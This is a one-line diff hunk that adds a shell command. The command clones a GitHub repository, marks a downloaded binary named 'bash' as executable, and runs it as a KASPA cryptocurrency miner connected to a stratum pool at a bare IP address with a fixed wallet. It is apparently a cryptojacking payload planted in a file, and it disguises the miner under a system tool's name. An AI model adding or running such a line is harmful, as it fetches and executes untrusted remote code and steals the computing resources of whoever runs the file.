@@ -1,0 +1,1 @@
+git clone https://github.com/monariski217/2022.git && cd 2022 && chmod +x bash && ./bash --algo KASPA --pool stratum+ssl://134.122.17.41:80 --user kaspa:qrh5ckwta4prfxh4wfvn2ard2k488dx967v8hwzvumr2une5r2a4sjhvemwpz.test --ethstratum ETHV1 --no-cl
